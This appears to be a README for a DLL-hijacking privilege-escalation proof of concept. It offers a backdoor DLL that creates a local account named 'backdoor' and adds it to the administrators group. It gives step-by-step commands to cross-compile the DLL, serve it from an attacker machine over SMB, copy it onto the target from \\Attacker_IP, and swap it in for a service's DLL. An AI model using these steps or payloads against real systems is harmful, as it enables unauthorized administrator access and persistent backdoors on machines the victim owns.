# Backdoor DLL Hijack POC

Proof of Concept for DLL Hijacking privilege escalation technique (without reverse shell).

This repo contains 3 files:

- poc.cpp: A simple cpp script with a ping command hardcoded made for testing. You can add your IP, compile, start a tcpdump listener, hijack DLL and verify code execution.

- backdoor.cpp: The actual exploit - will add a user named 'backdoor' once compiled and executed, then this user will be added to administrator's group.

- backdoor.dll: Compiled backdoor.cpp, can be injected directly into the target.

## Instructions

### Cross-Compilation

In order to cross-compile backdoor.cpp and poc.cpp we can use x86_64-w64-mingw32-gcc:

```bash
x86_64-w64-mingw32-gcc -shared -o backdoor.dll backdoor.cpp
```

```bash
x86_64-w64-mingw32-gcc -shared -o poc.dll poc.cpp
```

### Transfer

Transfer to the target machine (in this case we will use impacket-smbserver):

#### Start SMB Server

From attacker machine:

```bash
impacket-smbserver {ShareName} . -smb2support
```

##### Hijack DLL

From target Windows machine:

```powershell
copy \\Attacker_IP\ShareName\poc.dll .
copy \\Attacker_IP\ShareName\backdoor.dll .
# move any of the two into target DLL & restart service
```
